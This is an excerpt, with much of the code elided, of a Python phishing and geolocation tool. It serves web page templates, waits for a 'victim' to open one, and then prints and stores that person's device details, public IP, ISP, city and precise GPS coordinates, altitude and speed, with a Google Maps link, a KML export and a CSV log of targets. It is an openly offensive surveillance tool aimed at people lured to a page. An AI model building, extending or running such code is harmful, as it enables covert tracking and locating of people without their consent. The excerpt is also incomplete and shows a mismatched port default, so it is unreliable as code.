...
parser.add_argument('-p', '--port', type=int, default=122, help='Port for Web Server [ Default : 112 ]')
...
# def ver_check():
# 	print(G + '[+]' + R + ' Checking for Updates.....', end='')
...
def tunnel_select():
	if tunnel_mode == None:
		...
		print(G + '*' + G + '  start your own tunnel service manually...' + W + '\n')
	else:
		print(R + '*' + G + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
		exit()

def template_select():
	global site, info, result
	print(G + '#' + R + ' Select 1 or 2 :' + W + '\n')
	...
	for item in templ_json['templates']:
		name = item['name']
		print(R + '{} - '.format(templ_json['templates'].index(item)) + G + ' {}'.format(name) + W)
	...
	print('\n'  + R + '  {} Template '.format(templ_json['templates'][selected]['name']) + W)
...
def server():
	...
	try:
		...
		if php_sc == 200:
			...
			# print('http://' + local_ip_address + ':{}/index.html'.format(port))
		else:
...
def wait():
	...
	while True:
		...
		if size == 0 and printed == False:
			print('\n' + R + '$' + R + ' Waiting for the victim to enter >>>' + W + '\n')
			printed = True
		if size > 0:
			main()
	...
	try:
		...
		with open (info, 'r') as file2:
			...
			for value in json3['dev']:
				...
				print(R + '-------' + ' Device Information ------- ' + W + '\n')
				print(R + '*' + ' OS         > ' + W + var_os)
				print(R + '*' + ' Platform   > ' + W + var_platform)
				print(R + '*' + ' CPU Cores  > ' + W + var_cores)
				print(R + '*' + ' RAM        > ' + W + var_ram)
				print(R + '*' + ' GPU Vendor > ' + W + var_vendor)
				print(R + '*' + ' GPU        > ' + W + var_render)
				print(R + '*' + ' Resolution > ' + W + var_res)
				print(R + '*' + ' Browser    > ' + W + var_browser)
				print(R + '*' +  ' Public IP  > ' + W + var_ip)
				...
				if sc == 200:
					...
					print(R + '*' + ' Continent  > ' + W + var_continent)
					print(R + '*' + ' Country    > ' + W + var_country)
					print(R + '*' + ' Region     > ' + W + var_region)
					print(R + '*' + ' City       > ' + W + var_city)
					print(R + '*' + ' Org        > ' + W + var_org)
					print(R + '*' + ' ISP        > ' + W + var_isp)
	except ValueError:
		pass
	...
	try:
		with open (result, 'r') as file:
			...
			for value in json2['info']:
				...
				print ('\n' + R + '-------' + R + ' Location Information ------- ' + W + '\n')
				print (R + '$' + ' Latitude  > ' + W + var_lat)
				print (R + '$' + ' Longitude > ' + W + var_lon)
				print (R + '$' + ' Accuracy  > ' + W + var_acc)
				print (R + '$' + ' Altitude  > ' + W + var_alt)
				print (R + '$' + ' Direction > ' + W + var_dir)
				print (R + '$' + ' Speed     > ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + R + '*' + G + ' Google Maps: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
...
def kmlout(var_lat, var_lon):
	...
	print(R + '*' + G + ' KML File Generated: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
...
def csvout():
	...
	with open('db/results.csv', 'a') as csvfile:
		...
		writer.writerow(row)
	print(R + '*' + G + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
